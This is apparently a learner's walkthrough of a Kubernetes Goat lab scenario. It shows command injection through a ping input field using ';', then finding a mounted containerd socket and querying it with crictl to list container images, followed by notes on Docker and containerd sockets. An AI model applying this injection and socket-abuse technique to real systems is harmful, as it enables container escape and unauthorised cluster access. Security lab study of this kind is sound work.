
### The link of the official doc for this scenario
https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome

### How I exploited it step by step
To get started with the scenario, navigate to http://127.0.0.1:1231




<img width="1620" height="578" alt="image" src="https://github.com/user-attachments/assets/cbb45d02-4303-4b19-8caa-61ff08b0320d" />

It looks like a text input where you can feed in malicious commands. Simply write the command after the the IP address, which will be  executed after the `Ping 127.0.0.1`, using the dilemeter `;` (in Linux command).
I tested it with: `echo "hello"`. It works.

To execute docker-related commands, I need to know where docker socket is mounted at. I got a little bit hint from this picture in the doc:

<img width="784" height="585" alt="image" src="https://github.com/user-attachments/assets/d41b5012-ca66-4207-bd1e-1f6648ef707f" />

Used `ls` in the "custom" directory and found the docker socket in "custom/containerd/containerd.sock".

This is a CRI(Container Runtime Interface) socket.

Now I'm stucked again, so I checked the 2nd hint in the doc: "use the crictl binary to communicate with that with -r flag".

What is crictl?

crictl is a command-line interface for CRI-compatible container runtimes. You can use it to inspect and debug container runtimes and applications on a Kubernetes node. crictl and its source are hosted in the cri-tools repository

https://kubernetes.io/docs/tasks/debug/debug-cluster/crictl/

Found the newest release in the release page (https://github.com/kubernetes-sigs/cri-tools/releases) and install it:

`wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.34.0/crictl-v1.34.0-linux-amd64.tar.gz -O /usr/local/bin/crictl-v1.27.1-linux-amd64.tar.gz`

check whether it is been downloaded:

`ls /usr/local/bin`

then extract:

`tar -xvf /usr/local/bin/crictl-v1.27.1-linux-amd64.tar.gz -C /usr/local/bin/`

( -x: extract; -v: verbose: output the result file name: -f: specify the filename; -C: specify the target location， == --directory)

test the installation by:

`crictl -version`

then specify the endpoint to communicate with it ,and output the images 

`crictl --runtime-endpoint unix:///custom/containerd/containerd.sock images`

Success!

<img width="1794" height="531" alt="image" src="https://github.com/user-attachments/assets/9558737e-d3d5-400c-913e-08ec3786aa4d" />


### Some of my confusions and the corresponding answers

1. Why containerd.sock is mounted instead of docker.sock?
Docker contains docker.sock and containerd.sock.
docker.sock provides things like docker ps, docker run, docker stop...
containerd.sock manage the containers' lifecycle during the runtime.
Docker Daemon calls containerd to handle containers.
kubelet does not call Docker API，instead it uses CRI API. (Cause CRI is enought for it)

2. What is DIND?
   TODO
4. Where is DIND used?
   TODO

### Some other notes

1. The official doc shows a better way to find the mounted socket, simply use the `mount` command:


<img width="1268" height="850" alt="image" src="https://github.com/user-attachments/assets/5e49567b-92a7-42df-98d1-370111226441" />

2. Before downloading a binary file, check the detail of the system using `uname -a`, to locate on an suitable released version.
































# Notes on Linux:
exit code 127: command does not exist

